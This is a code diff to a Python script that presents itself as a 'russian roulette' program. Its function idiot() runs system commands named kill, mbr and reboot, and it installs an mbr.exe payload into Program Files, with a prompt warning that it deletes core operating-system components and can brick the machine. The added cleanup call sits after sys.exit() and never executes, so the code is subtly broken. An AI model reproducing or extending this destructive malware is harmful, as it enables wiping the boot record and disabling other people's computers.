@@ -47,6 +47,7 @@ def idiot():
 	os.system(kill)
 	os.system(mbr)
 	os.system(reboot)
+	quit()
 
 if isAdmin():
 	pass
@@ -57,6 +58,14 @@ else:
 		wait -= 1
 		os.system("cls")
 	quit()
+
+def x():
+	os.remove("C:/Program Files/pussianroulette/mbr.exe")
+	os.remove("C:/Program Files/pussianroulette/api-ms-win-core-path-l1-1-0.dll")
+	os.remove("C:/Program Files/pussianroulette/msvcp140d.dll")
+	os.remove("C:/Program Files/pussianroulette/urctbased.dll")
+	os.remove("C:/Program Files/pussianroulette/vcruntime140_1d.dll")
+	os.rmdir("C:/Program Files/pussianroulette/")
 
 os.mkdir("C:/Program Files/pussianroulette")
 shutil.move("temp/mbr.exe", "C:/Program Files/pussianroulette")
@@ -79,6 +88,7 @@ else:
 
 def quit():
 	sys.exit()
+	x()
 
 sure = input("""\nAre you TOTALLY sure? This program WILL delete your operating system's core components!!\n
 THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR UNUSABLE OR BRICKED MACHINES! RUN AT YOUR OWN RISK! (yes/no)\n""")
